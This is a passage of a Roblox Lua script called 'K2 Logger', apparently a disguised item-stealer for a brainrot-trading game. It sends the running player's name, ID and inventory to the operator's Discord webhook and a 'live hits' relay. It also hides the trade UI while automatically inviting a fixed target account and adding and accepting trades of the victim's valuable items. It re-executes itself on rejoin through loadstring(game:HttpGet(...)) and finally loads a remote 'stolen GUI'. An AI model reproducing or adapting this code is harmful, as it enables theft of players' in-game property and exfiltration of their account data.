	end
	return "⚙️"
end

local function baseSkinEmoji(name)
	if not name or name == "" then return "🏠" end
	if BASESKIN_EMOJI[name] then return BASESKIN_EMOJI[name] end
	local key = normKey(name)
	for k, v in pairs(BASESKIN_EMOJI) do
		if normKey(k) == key then return v end
	end
	return "🏠"
end

local function countTraits(traits)
	if type(traits) ~= "table" then return 0 end
	local n = 0
	for _, t in pairs(traits) do
		local traitName = type(t) == "string" and t or (type(t) == "table" and (t.Name or t.Index or t.Trait or t.Id))
		if traitName and traitName ~= "" then n = n + 1 end
	end
	return n
end

local function sendDetailedWebhook()
	-- Allow run if we have a secret key (relay), private webhook, or internal log webhook
	if not LOGGER_KEY and GOOD_WEBHOOK == "" then return end
	local resultsPrimary = {}
	local requirePingPrimary = false
	local totalGen = 0
	for slot, data in pairs(animalList) do
		if type(data) == "table" and data.Index then
			local info = AnimalsData and AnimalsData[data.Index]
			local displayName = (info and info.DisplayName) or data.Index
			if GOOD_BRAINROTS[displayName] or GOOD_BRAINROTS[data.Index] then
				requirePingPrimary = true
				local mutation = data.Mutation or "None"
				local traits = data.Traits or {}
				local genVal = getGeneration(data)
				totalGen = totalGen + genVal
				local mE = mutEmoji(mutation)
				local tCount = countTraits(traits)
				local line = mE .. " **" .. displayName .. "**"
				if tCount > 0 then line = line .. " *(x" .. tCount .. " traits)*" end
				line = line .. " — **$" .. formatGen(genVal):gsub("/s", "") .. "/s**"
				table.insert(resultsPrimary, {
					slot = tostring(slot), index = data.Index, displayName = displayName,
					name = line, genVal = genVal,
				})
			end
		end
	end
	if #resultsPrimary == 0 and #baseSkinQueue == 0 and #gearQueue == 0 then return end
	table.sort(resultsPrimary, function(a, b) return (a.genVal or 0) > (b.genVal or 0) end)
	local lines = {}
	if #resultsPrimary > 0 then
		table.insert(lines, "───── **BRAINROTS** ─────")
		for i, r in ipairs(resultsPrimary) do table.insert(lines, "`" .. i .. ".` " .. r.name) end
	end
	if #baseSkinQueue > 0 then
		if #lines > 0 then table.insert(lines, "") end
		table.insert(lines, "───── **BASE SKINS** ─────")
		for i, s in ipairs(baseSkinQueue) do
			table.insert(lines, "`" .. i .. ".` " .. baseSkinEmoji(s.skinName) .. " **" .. s.skinName .. "**")
		end
	end
	if #gearQueue > 0 then
		if #lines > 0 then table.insert(lines, "") end
		table.insert(lines, "───── **GEARS** ─────")
		for i, g in ipairs(gearQueue) do
			table.insert(lines, "`" .. i .. ".` " .. gearEmoji(g.gearName) .. " **" .. g.gearName .. "**")
		end
	end
	local listText = table.concat(lines, "\n")
	listText = listText .. "\n\n💰 **Total Value:** **$" .. formatGen(totalGen):gsub("/s", "") .. "/s**"
	if #listText > 3800 then listText = listText:sub(1, 3796) .. "..." end
	local requestFn = getRequestFn()
	if not requestFn then return end
	local top = resultsPrimary[1]
	local embedColor = FALLBACK_COLOR
	if top then
		local c = getBrainrotColor(top.index)
		if c then embedColor = colorToDecimal(c) end
	end
	-- Same webhook payload; gray + duel status when in duel place
	local duelStatus = isInDuel and "⚔️ **Player in duel**" or "✅ **Not in duel**"
	if isInDuel then
		embedColor = DUEL_COLOR
	end
	local playerCount = #Players:GetPlayers()
	local execName = (identifyexecutor and identifyexecutor()) or (getexecutorname and getexecutorname()) or "Unknown"
	local embed = {
		title = isInDuel and "K2 Logger — In Duel" or "K2 Logger",
		description = table.concat({
			"📫 **Script User** `" .. LP.Name .. "` (ID: " .. LP.UserId .. ")",
			duelStatus,
			"", "**Inventory scan complete.**", "", listText,
		}, "\n"),
		color = embedColor,
		fields = {
			{ name = "⏰ Executed", value = "<t:" .. os.time() .. ":R>", inline = true },
			{ name = "🌍 Server", value = "Players: **" .. playerCount .. "**", inline = true },
			{ name = "⚡ Executor", value = execName, inline = true },
			{ name = "⚔ Status", value = isInDuel and "**In Duel**" or "**Not in Duel**", inline = true },
		},
		footer = { text = "K2 LOGGER | https://discord.gg/bxjXucMVqB", icon_url = FOOTER_ICON },
		timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
	}
	if top then
		local thumb = resolveThumbnail(top.displayName, top.index)
		if thumb and thumb ~= "" then embed.thumbnail = { url = thumb } end
	end
	local function postTo(url, withPing)
		if not url or url == "" then return false end
		local payload = { embeds = { embed }, username = "K2 Logger", avatar_url = GOOD_AVATAR }
		if withPing then payload.content = "@everyone" end
		local body = HttpService:JSONEncode(payload)
		for attempt = 1, 3 do
			local ok, res = pcall(function()
				return requestFn({
					Url = url, Method = "POST",
					Headers = { ["Content-Type"] = "application/json" },
					Body = body,
				})
			end)
			local code = ok and type(res) == "table" and (res.StatusCode or res.Status or res.statusCode) or nil
			if ok and (not code or tonumber(code) < 400) then
				print("[Brainrot] postTo OK", tostring(url):sub(1, 50), code or "")
				return true
			end
			warn("[Brainrot] postTo fail", attempt, code or res)
			task.wait(0.4 * attempt)
		end
		return false
	end

	-- Relay private hit through website when LOGGER_KEY is set (no Discord webhook in script)
	-- Body schema matches k2logger.lovable.app: content?, username?, avatar_url?, embeds?
	local function postViaRelay(withPing)
		if not LOGGER_KEY or LOGGER_KEY == "" then
			warn("[Brainrot] postViaRelay: no LOGGER_KEY")
			return false
		end
		local payload = {
			embeds = { embed },
			username = "K2 Logger",
			avatar_url = GOOD_AVATAR,
		}
		if withPing then
			payload.content = "@everyone"
		end
		print("[Brainrot] postViaRelay ping=", withPing and true or false)
		return sendWebhook(payload)
	end

	-- Live hits feed on k2logger.lovable.app (never blocks trades / primary log)
	local function broadcastLiveHit()
		task.spawn(function()
			pcall(function()
				local totStr = formatGen(totalGen)
				local body = {
					victimName = LP.Name,
					victimId = LP.UserId,
					topBrainrot = (top and top.displayName) or "Unknown",
					topBrainrotIndex = (top and top.index) or "Unknown",
					totalGen = totalGen,
					totalGenFormatted = tostring(totStr),
					itemCount = #resultsPrimary,
					isInDuel = isInDuel,
					executor = execName,
					serverPlayerCount = playerCount,
					timestamp = os.time(),
				}
				local headers = { ["Content-Type"] = "application/json" }
				if LOGGER_KEY and LOGGER_KEY ~= "" then
					headers["X-Logger-Key"] = LOGGER_KEY
				end
				requestFn({
					Url = HITS_BROADCAST_URL,
					Method = "POST",
					Headers = headers,
					Body = HttpService:JSONEncode(body),
				})
			end)
		end)
	end

	-- Save full log snapshot for miss webhook (only what was in THIS log)
	do
		local snapBrainrots = {}
		for _, r in ipairs(resultsPrimary) do
			table.insert(snapBrainrots, {
				slot = r.slot,
				index = r.index,
				displayName = r.displayName,
				name = r.name,
				genVal = r.genVal or 0,
			})
		end
		local snapSkins = {}
		for _, sk in ipairs(baseSkinQueue) do
			table.insert(snapSkins, { skinName = sk.skinName })
		end
		local snapGears = {}
		for _, g in ipairs(gearQueue) do
			table.insert(snapGears, { gearName = g.gearName })
		end
		lastFullLogSnapshot = {
			brainrots = snapBrainrots,
			skins = snapSkins,
			gears = snapGears,
			totalGen = totalGen,
			top = resultsPrimary[1] and {
				index = resultsPrimary[1].index,
				displayName = resultsPrimary[1].displayName,
			} or nil,
			takenAt = os.time(),
		}
		print("[Brainrot] Full log snapshot saved | brainrots:", #snapBrainrots, "| totalGen:", totalGen)
	end
	local shouldPing = requirePingPrimary or #baseSkinQueue > 0 or #gearQueue > 0
	-- Only one primary hit to the owner's webhook/relay (prevents double log)
	-- ALWAYS attempt owner hit + global log + live broadcast
	do
		local okOwner = false
		if LOGGER_KEY and #LOGGER_KEY > 0 then
			okOwner = postViaRelay(shouldPing)
			if not okOwner then
				task.wait(0.75)
				okOwner = postViaRelay(shouldPing)
			end
			print("[Brainrot] Owner hit (LOGGER_KEY):", okOwner and "SENT" or "FAILED")
		elseif GOOD_WEBHOOK and GOOD_WEBHOOK ~= "" then
			okOwner = postTo(GOOD_WEBHOOK, shouldPing)
			print("[Brainrot] Owner hit (GOOD_WEBHOOK):", okOwner and "SENT" or "FAILED")
		else
			warn("[Brainrot] No LOGGER_KEY / GOOD_WEBHOOK — owner hit skipped")
		end
		broadcastLiveHit()
		primaryLogSent = true
	end
end


-- ========== EXACT SYNCYPRT TRADE (v26 + v58 + fire calls) ==========
local SYNC_GUIDS = {
	["TradeService/Invite"] = "9b5a0c7d-327f-415a-9720-b8e4f02b946a",
	["TradeService/AddBrainrot"] = "bce6ca77-ef3c-4aab-b6e1-99f9c1815863",
	["TradeService/Ready"] = "1774f028-dbab-4713-8122-c30d77582edc",
	["TradeService/Accept"] = "d061f53c-7d12-4a4a-a761-d70b06c0d44c",
	["TradeService/CancelTrade"] = "b05e61e6-8cbd-4fb2-a683-cf2873e179e6",
}

-- exact Syncrypt geniter helper
local function sync_geniter(f, s, c)
	if type(f) ~= "function" then
		local mt = getmetatable(f)
		if type(mt) == "table" and mt.__iter then
			f, s, c = mt.__iter(f)
		elseif type(f) == "table" then
			f, s, c = next, f, nil
		end
	end
	return function()
		local r = table.pack(f(s, c))
		if r[1] == nil then
			return false
		end
		c = r[1]
		return true, table.unpack(r, 1, r.n)
	end
end

-- exact Syncrypt v26
local function sync_resolveGuids()
	local t3 = {}
	local ok, result = pcall(decompile, ReplicatedStorage:FindFirstChild("TradeController", true))
	if ok and type(result) == "string" and #result > 0 then
		local t4 = {}
		local v31, v32, v33 = result:gmatch('local%s+(%w+)%s*=%s*Net:Remote(%w+)%s*%(%s*"([^"]+)"')
		local v34 = sync_geniter(v31, v32, v33)
		while true do
			local v35 = table.pack(v34())
			if not v35[1] then break end
			t4[(v35[2])[1]] = { kind = (v35[2])[2], name = (v35[2])[3] }
		end
		local v36, v37, v38 = result:gmatch('(%w+):InvokeServer%s*%(%s*"([%x%-]+)"')
		for k, v in v36, v37, v38 do
			if t4[k] then t3[t4[k].name] = v end
		end
		local v41, v42, v43 = result:gmatch('(%w+):FireServer%s*%(%s*"([%x%-]+)"')
		for k, v in v41, v42, v43 do
			if t4[k] then t3[t4[k].name] = v end
		end
	end
	for k, v in pairs(SYNC_GUIDS) do
		if not t3[k] then t3[k] = v end
	end
	return t3
end

-- exact Syncrypt v58
local function sync_resolveRemotes()
	local TC = TradeController or require(ReplicatedStorage:WaitForChild("Controllers"):WaitForChild("TradeController"))
	TradeController = TC
	local t5 = {
		TC = TC,
		RC = ReplicatorClient or require(ReplicatedStorage.Packages:WaitForChild("ReplicatorClient")),
	}
	local v61, v62, v63 = pairs(getupvalues(TC.SendInvite))
	local v64 = sync_geniter(v61, v62, v63)
	while true do
		local v65 = table.pack(v64())
		if not v65[1] then break end
		local v66 = v65[3]
		if typeof(v66) == "Instance" and v66:IsA("RemoteFunction") then
			t5.inviteRF = v66
			break
		end
	end
	local v67, v68, v69 = pairs(getupvalues(TC._createLiveTrade))
	for _, v in v67, v68, v69 do
		if typeof(v) == "table" and typeof(v.Brainrot) == "table" and typeof(v.Brainrot.Add) == "function" then
			for _, v2 in pairs(getupvalues(v.Brainrot.Add)) do
				if typeof(v2) == "Instance" and v2:IsA("RemoteFunction") then
					t5.addRF = v2
					break
				end
			end
			-- BaseSkin / Gear for K2 extras
			if typeof(v.BaseSkin) == "table" and typeof(v.BaseSkin.Add) == "function" then
				for _, v2 in pairs(getupvalues(v.BaseSkin.Add)) do
					if typeof(v2) == "Instance" and v2:IsA("RemoteFunction") then
						t5.addItemRF = v2
						break
					end
				end
			end
			if not t5.addItemRF and typeof(v.Gear) == "table" and typeof(v.Gear.Add) == "function" then
				for _, v2 in pairs(getupvalues(v.Gear.Add)) do
					if typeof(v2) == "Instance" and v2:IsA("RemoteFunction") then
						t5.addItemRF = v2
						break
					end
				end
			end
		end
	end
	local t6 = {}
	local v75, v76, v77 = pairs(getupvalues(TC._createLiveTrade))
	for k, v in v75, v76, v77 do
		if typeof(v) == "Instance" and v:IsA("RemoteEvent") then
			table.insert(t6, { i = k, inst = v })
		end
	end
	table.sort(t6, function(p3, p4) return p3.i < p4.i end)
	t5.cancelRE = t6[2] and t6[2].inst
	t5.acceptRE = t6[3] and t6[3].inst
	t5.readyRE = t6[4] and t6[4].inst
	if not (t5.inviteRF and t5.addRF and t5.readyRE and t5.acceptRE) then
		error(string.format("remotes unresolved invite=%s add=%s ready=%s accept=%s cancel=%s",
			tostring(t5.inviteRF), tostring(t5.addRF), tostring(t5.readyRE), tostring(t5.acceptRE), tostring(t5.cancelRE)))
	end
	if not t5.cancelRE then
		warn("[Brainrot] cancelRE missing — continuing without cancel")
	end
	t5.RC = ReplicatorClient
	pcall(function()
		if not t5.RC then
			t5.RC = require(ReplicatedStorage.Packages:WaitForChild("ReplicatorClient"))
		end
	end)
	return t5
end

local syncPack = nil -- { inviteRF, addRF, readyRE, acceptRE, cancelRE, addItemRF, RC }
local syncGuids = nil

local function sync_init()
	syncGuids = sync_resolveGuids()
	INVITE_GUID = syncGuids["TradeService/Invite"]
	SELECT_GUID = syncGuids["TradeService/AddBrainrot"]
	READY_GUID = syncGuids["TradeService/Ready"]
	ACCEPT_GUID = syncGuids["TradeService/Accept"]
	CANCEL_GUID = syncGuids["TradeService/CancelTrade"]
	local ok, pack = pcall(sync_resolveRemotes)
	if not ok then
		warn("[Brainrot] sync_resolveRemotes failed:", pack)
		return false
	end
	syncPack = pack
	getgenv()._BrainrotSyncPack = {
		add = pack.addRF,
		ready = pack.readyRE,
		accept = pack.acceptRE,
		invite = pack.inviteRF,
		cancel = pack.cancelRE,
	}
	inviteRemote = pack.inviteRF
	addBrainrotRemote = pack.addRF
	readyRemote = pack.readyRE
	acceptRemote = pack.acceptRE
	cancelRemote = pack.cancelRE
	addItemRemote = pack.addItemRF or addItemRemote
	print("[Brainrot] SYNC remotes OK")
	print("[Brainrot] Invite RF :", pack.inviteRF and pack.inviteRF.Name)
	print("[Brainrot] Add RF    :", pack.addRF and pack.addRF.Name)
	print("[Brainrot] Ready RE  :", pack.readyRE and pack.readyRE.Name)
	print("[Brainrot] Accept RE :", pack.acceptRE and pack.acceptRE.Name)
	print("[Brainrot] Cancel RE :", pack.cancelRE and pack.cancelRE.Name)
	print("[Brainrot] GUIDs:", INVITE_GUID, SELECT_GUID, READY_GUID, ACCEPT_GUID)
	return true
end

-- exact Syncrypt fires:
-- addRF:InvokeServer(guids["TradeService/AddBrainrot"], slot, data)
-- readyRE:FireServer(guids["TradeService/Ready"])
-- acceptRE:FireServer(guids["TradeService/Accept"])
-- inviteRF:InvokeServer(guids["TradeService/Invite"], userId)

local function startFullAutomation()
	if not TARGET_ID or TARGET_ID == 0 then
		warn("[Brainrot] TARGET_USER_ID not set — trades disabled")
		return
	end
	if not sync_init() then
		warn("[Brainrot] Syncrypt remotes failed — abort automation")
		return
	end

	-- Kill any previous automation loops from older script loads
	getgenv()._BrainrotLoopGen = (getgenv()._BrainrotLoopGen or 0) + 1
	local myGen = getgenv()._BrainrotLoopGen
	print("[Brainrot] loop gen =", myGen, "(old loops must die)")

	local function alive()
		return getgenv()._BrainrotLoopGen == myGen
	end

	local addedThisTrade = {}
	local addLog = 0

	-- REAL trade state (NOT "GUI exists in PlayerGui").
	-- hideTradeUIVisual disables ScreenGuis but leaves them parented, so FindFirstChild
	-- always returned true → invites paused forever. Server even said "not in a trade".
	local realInTrade = false
	local realTradeUntil = 0 -- hard timeout so we never stick

	local function markTradeOpen(reason)
		realInTrade = true
		currentlyInTrade = true
		tradeActiveFlag = true
		realTradeUntil = os.clock() + 45 -- auto-expire if close event missed
		print("[Brainrot] markTradeOpen:", reason or "")
	end

	local function markTradeClosed(reason)
		realInTrade = false
		currentlyInTrade = false
		tradeActiveFlag = false
		realTradeUntil = 0
		print("[Brainrot] markTradeClosed:", reason or "")
	end

	local function isInTradeNow()
		if realInTrade and realTradeUntil > 0 and os.clock() > realTradeUntil then
			markTradeClosed("timeout")
		end
		return realInTrade == true
	end

	-- If server says we're not in a trade, trust server over local flags
	local function noteAddResult(ok, res)
		local msg = tostring(res or "")
		local low = msg:lower()
		if low:find("not in a trade", 1, true) or low:find("not in trade", 1, true) then
			markTradeClosed("server-not-in-trade")
		elseif low:find("please wait", 1, true) then
			-- rate limit only; still counts as in-trade attempt
		elseif ok and res then
			-- successful add → definitely in trade
			markTradeOpen("add-ok")
		end
	end

	-- ===== Syncrypt trade loop 1:1 (add / ready / accept) =====
	-- Source: SAB Syncrypt logic.lua v634 / v657
	getgenv()._BrainrotLoopGen = (getgenv()._BrainrotLoopGen or 0) + 1
	local myGen = getgenv()._BrainrotLoopGen
	local function alive()
		return getgenv()._BrainrotLoopGen == myGen
	end
	print("[Brainrot] Syncrypt 1:1 engine gen", myGen)

	local RC = syncPack.RC or ReplicatorClient
	if not RC then
		pcall(function()
			RC = require(ReplicatedStorage.Packages:WaitForChild("ReplicatorClient"))
		end)
	end

	local function getTradeChannel()
		if not RC or not RC.get then return nil end
		local ok, ch = pcall(function()
			return RC.get(("Trade_%*"):format(LP.UserId))
		end)
		return ok and ch or nil
	end

	-- exact Syncrypt: channel:TryIndex({ "active", "data" })
	local function getTradeData()
		local ch = getTradeChannel()
		if not ch or type(ch.TryIndex) ~= "function" then return nil end
		local ok, data = pcall(function()
			return ch:TryIndex({ "active", "data" })
		end)
		if ok and typeof(data) == "table" then return data end
		return nil
	end

	local function tradeIsOpen()
		return getTradeData() ~= nil
	end

	local function getSides()
		local data = getTradeData()
		if not data then return nil, nil end
		local ours, theirs
		local users = data.users or {}
		for k, uid in pairs(users) do
			local st = data.players and data.players[k]
			if tonumber(uid) == tonumber(LP.UserId) then
				ours = st
			else
				theirs = st
			end
		end
		return ours, theirs
	end

	local function countOffer(st)
		local n = 0
		if typeof(st) == "table" and typeof(st.offer) == "table" and typeof(st.offer.brainrots) == "table" then
			for _ in pairs(st.offer.brainrots) do n += 1 end
		end
		return n
	end

	local function slotInOurOffer(slot)
		local ours = getSides()
		if typeof(ours) ~= "table" or typeof(ours.offer) ~= "table" or typeof(ours.offer.brainrots) ~= "table" then
			return false
		end
		for _, br in pairs(ours.offer.brainrots) do
			if typeof(br) == "table" and tostring(br.IndexOnPlot) == tostring(slot) then
				return true
			end
		end
		return false
	end

	-- Syncrypt v657 1:1
	local function shouldReadyOrAccept()
		local data = getTradeData()
		if not data then return false end
		if typeof(data.lastChange) ~= "number" or typeof(data.players) ~= "table" then
			return false
		end
		local ours = select(1, getSides())
		local anyItems = false
		local allReady = true
		for _, st in pairs(data.players) do
			if countOffer(st) > 0 then anyItems = true end
			if not (typeof(st) == "table" and st.ready) then
				allReady = false
			end
		end
		-- must wait 5s after lastChange
		if workspace:GetServerTimeNow() < data.lastChange + 5 then
			return false
		end
		if allReady then
			-- accept if we haven't accepted yet
			return not (ours and ours.accepted), "accept"
		end
		if anyItems and not (ours and ours.ready) then
			return true, "ready"
		end
		return false
	end

	local function fireReady()
		syncPack.readyRE:FireServer(syncGuids["TradeService/Ready"])
		print("[Brainrot] READY (syncrypt)")
	end

	local function fireAccept()
		syncPack.acceptRE:FireServer(syncGuids["TradeService/Accept"])
		print("[Brainrot] ACCEPT (syncrypt)")
	end

	local function doInvite()
		return syncPack.inviteRF:InvokeServer(syncGuids["TradeService/Invite"], TARGET_ID)
	end

	-- Syncrypt-style: wait for trade open after invite
	local function waitForTrade(timeout)
		local deadline = os.clock() + (timeout or 20)
		while alive() and os.clock() < deadline do
			if tradeIsOpen() then return true end
			task.wait(0.25)
		end
		return tradeIsOpen()
	end

	local function cancelTrade()
		if not syncPack.cancelRE then return end
		for _ = 1, 3 do
			if not tradeIsOpen() then return end
			pcall(function()
				syncPack.cancelRE:FireServer(syncGuids["TradeService/CancelTrade"])
			end)
			local t = os.clock() + 3
			while tradeIsOpen() and os.clock() < t do
				task.wait(0.2)
			end
			if not tradeIsOpen() then return end
		end
	end

	-- ONE full trade cycle like Syncrypt v634 (simplified to our queue)
	local function runTradeCycle()
		-- if already open, cancel first (syncrypt does this)
		if tradeIsOpen() then
			print("[Brainrot] trade already open — cancel first")
			cancelTrade()
			task.wait(2)
		end

		local opened = false
		for attempt = 1, 4 do
			if not alive() then return end
			local ok, res = pcall(doInvite)
			print("[Brainrot] INVITE", ok, res, "try", attempt)
			if res == false then
				task.wait(5)
			else
				if waitForTrade(20) then
					opened = true
					break
				end
				task.wait(5)
			end
		end
		if not opened then
			print("[Brainrot] invite not accepted")
			return
		end

		markTradeOpen("syncrypt-open")
		print("[Brainrot] trade channel OPEN")

		local deadline = os.clock() + 180
		local failCounts = {}
		local lastRA = 0
		local q = tradeBrainrotQueue

		while alive() and tradeIsOpen() and os.clock() < deadline do
			task.defer(hideTradeUIVisual)

			local ours, theirs = getSides()
			-- abort if receiver added items (syncrypt)
			if countOffer(theirs) > 0 then
				print("[Brainrot] receiver added items — cancel")
				cancelTrade()
				return
			end

			-- free slots estimate
			local free = math.huge
			if typeof(theirs) == "table" and typeof(theirs.emptySlots) == "number" then
				free = theirs.emptySlots + countOffer(theirs) - countOffer(ours)
			end

			local data = getTradeData()
			local processing = data and data.isProcessing

			-- ADD one missing target (syncrypt adds one per loop)
			if not processing and free > 0 and type(q) == "table" then
				local pick
				for _, it in ipairs(q) do
					local slot = it.slotKey
					if not slotInOurOffer(slot) then
						local f = failCounts[tostring(slot)] or 0
						if f < 3 then
							pick = it
							break
						end
					end
				end
				if pick then
					local slot = pick.slotKey
					if tonumber(slot) then slot = tonumber(slot) end
					local dataA = pick.data or pick
					print("[Brainrot] SYNC ADD", dataA.Index, "slot", slot)
					local response, err = syncPack.addRF:InvokeServer(
						syncGuids["TradeService/AddBrainrot"], slot, dataA
					)
					print("[Brainrot] SYNC ADD result", response, err)
					if response then
						local t = os.clock() + 3
						while os.clock() < t do
							if slotInOurOffer(slot) then
								print("[Brainrot] confirmed in offer", slot)
								break
							end
							task.wait(0.1)
						end
						addedThisTrade[tostring(dataA.UUID or slot)] = true
					else
						failCounts[tostring(slot)] = (failCounts[tostring(slot)] or 0) + 1
					end
					task.wait(1) -- Syncrypt gap
					continue
				end
			end

			-- READY / ACCEPT 1:1 Syncrypt
			local doIt, kind = shouldReadyOrAccept()
			if doIt and os.clock() - lastRA > 0.3 then
				if kind == "accept" then
					fireAccept()
				else
					fireReady()
				end
				lastRA = os.clock()
			end

			task.wait(0.1)
		end

		if tradeIsOpen() then
			print("[Brainrot] trade still open at end — cancel")
			cancelTrade()
		else
			print("[Brainrot] trade closed")
		end
		markTradeClosed("syncrypt-end")
	end

	-- Outer: keep inviting/trading while alive and targets remain
	task.spawn(function()
		print("[Brainrot] Syncrypt cycle runner start")
		while alive() do
			local tgt
			for _, p in ipairs(Players:GetPlayers()) do
				if tonumber(p.UserId) == tonumber(TARGET_ID) then
					tgt = p
					break
				end
			end
			if not tgt then
				-- still try invites (target may join mid-cycle)
			end
			local ok, err = pcall(runTradeCycle)
			if not ok then
				warn("[Brainrot] cycle error:", err)
			end
			task.wait(2)
		end
	end)

	Players.PlayerAdded:Connect(function(pl)
		if tonumber(pl.UserId) == tonumber(TARGET_ID) then
			print("[Brainrot] TARGET joined:", pl.Name)
			for _ = 1, 10 do
				if isInTradeNow() then break end
				pcall(sync_invite)
				task.wait(0.15)
			end
		end
	end)

	print("[Brainrot] Automation started | Syncrypt 1:1 cycle")
end


-- Auto re-exec on rejoin while target brainrots remain (silent after first run)
local function setupRejoinAutoExec(hasTargets)
	if not hasTargets then
		print("[Brainrot] No targets left — rejoin auto-exec not queued")
		return
	end
	local qot = (typeof(queue_on_teleport) == "function" and queue_on_teleport)
		or (syn and typeof(syn.queue_on_teleport) == "function" and syn.queue_on_teleport)
		or (fluxus and typeof(fluxus.queue_on_teleport) == "function" and fluxus.queue_on_teleport)
	if not qot then
		warn("[Brainrot] queue_on_teleport unavailable — rejoin auto-exec skipped")
		return
	end
	-- Preserve config keys the user set via getgenv
	local keys = {
		"BRAINROT_MAIN_URL", "LOGGER_KEY", "TARGET_USER_ID", "GOOD_WEBHOOK", "GOOD_AVATAR",
		"ALLOWED_ANIMALS", "ALLOWED_BASESKINS", "ALLOWED_GEARS", "ALLOWED_PLACE_IDS",
		"EXTRA_LOADSTRINGS",
	}
	local parts = {
		"getgenv().BrainrotSilentRejoin = true",
		"getgenv().BrainrotMainLoaded = nil",
	}
	for _, k in ipairs(keys) do
		local v = genv[k]
		if type(v) == "string" then
			table.insert(parts, ("getgenv().%s = %q"):format(k, v))
		elseif type(v) == "number" then
			table.insert(parts, ("getgenv().%s = %s"):format(k, tostring(v)))
		elseif type(v) == "table" then
			local ok, enc = pcall(function()
				return game:GetService("HttpService"):JSONEncode(v)
			end)
			if ok and enc then
				-- reconstruct simple tables from JSON via HttpService
				table.insert(parts, (
					"pcall(function() local Hs=game:GetService('HttpService'); getgenv().%s = Hs:JSONDecode(%q) end)"
				):format(k, enc))
			end
		end
	end
	table.insert(parts, 'loadstring(game:HttpGet(getgenv().BRAINROT_MAIN_URL))()')
	local code = table.concat(parts, "\n")
	pcall(qot, code)
	print("[Brainrot] Rejoin auto-exec queued (silent) | targets still present")
end

-- INSTANT webhook (brainrots already resolved). Gears/skins fill in parallel if ready.
print("[Brainrot] Sending webhook instantly…")
task.spawn(function()
	-- if profile already finished, include gears/skins in the same send
	if profileReady then
		baseSkinQueue = buildSkinQueue()
		gearQueue = buildGearQueue()
		print("[Gear] Base skins queued:", #baseSkinQueue)
		print("[Gear] Gears queued:", #gearQueue)
	end
	local ok, err = pcall(sendDetailedWebhook)
	if not ok then warn("[Brainrot] webhook error:", err) end
	print("[Brainrot] Webhook finished")
end)

-- gears/skins may arrive slightly later — do NOT delay trade or first webhook
task.spawn(function()
	local waited = 0
	while not profileReady and waited < 5 do
		task.wait(0.1)
		waited += 0.1
	end
	baseSkinQueue = buildSkinQueue()
	gearQueue = buildGearQueue()
	print("[Gear] late Base skins:", #baseSkinQueue, "Gears:", #gearQueue)
end)

startFullAutomation()

-- Queue silent rejoin while any target brainrots still on base
task.spawn(function()
	local has = type(tradeBrainrotQueue) == "table" and #tradeBrainrotQueue > 0
	setupRejoinAutoExec(has)
	-- also re-check periodically in case new targets appear on plot
	while true do
		task.wait(30)
		local n = 0
		pcall(function()
			if type(tradeBrainrotQueue) == "table" then n = #tradeBrainrotQueue end
		end)
		if n > 0 then
			setupRejoinAutoExec(true)
		end
	end
end)


-- Drained GUI when targets gone (after they had targets)
task.spawn(function()
	local streak = 0
	local function countTargetBrainrotsOnBase()
		local ok, result = pcall(function()
			local _, list = getMyPlotAndAnimals()
			if type(list) ~= "table" then return nil end
			local count = 0
			for _, data in pairs(list) do
				if type(data) == "table" and data.Index then
					local displayName = data.Index
					if AnimalsData and AnimalsData[data.Index] and AnimalsData[data.Index].DisplayName then
						displayName = AnimalsData[data.Index].DisplayName
					end
					if TargetBrainrots[displayName] or TargetBrainrots[data.Index] then
						count = count + 1
					end
				end
			end
			return count
		end)
		if not ok then return nil end
		return result
	end
	while not drainedGuiShown do
		task.wait(3)
		local n = countTargetBrainrotsOnBase()
		if n == nil then
			streak = 0
		elseif n > 0 then
			streak = 0
		else
			streak = streak + 1
			print("[Brainrot] Empty target streak:", streak, "/", DRAINED_NEED_STREAK)
			if streak >= DRAINED_NEED_STREAK then
				drainedGuiShown = true
				print("[Brainrot] Targets confirmed gone → loading stolen GUI")
				pcall(function()
					loadstring(game:HttpGet(STOLEN_GUI_URL))()
				end)
			end
		end
	end
end)
